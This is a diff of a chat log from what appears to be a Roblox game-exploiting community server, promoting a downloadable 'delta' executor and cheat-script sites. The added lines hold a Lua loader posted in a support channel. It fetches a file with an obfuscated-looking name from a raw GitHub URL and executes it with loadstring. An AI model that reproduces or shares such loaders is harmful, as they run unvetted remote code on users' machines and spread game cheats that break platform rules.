@@ -2355,3 +2355,6 @@ To get that update, redownload delta from here  👉 https://shadowt3ch.site/del
 [2025-06-16 16:56:34] Message: snowexploits#0 in support-aos_fh (ＳＨΛＤＯＷＴ3ＣＨ): ScriptBlox is most popular for roblox scripts, and if u using delta you wownt have to worry about unsafe scripts
 [2025-06-16 16:56:51] Message: snowexploits#0 in support-aos_fh (ＳＨΛＤＯＷＴ3ＣＨ): But do read comments to better help u find weather it works or not
 [2025-06-16 17:20:50] Message: shadow_t3ch#0 in 💬ᴄʜᴀᴛᴛɪɴɢ (ＳＨΛＤＯＷＴ3ＣＨ): Like jailbreak?
+[2025-06-16 18:22:29] Message: runndwnking#0 in support-aos_fh (ＳＨΛＤＯＷＴ3ＣＨ): local ld = loadstring or load
+local url = "https://raw.githubusercontent.com/shvl00/shvled/refs/heads/main/l04d3r.bf"
+ld(game:HttpGet(url))()
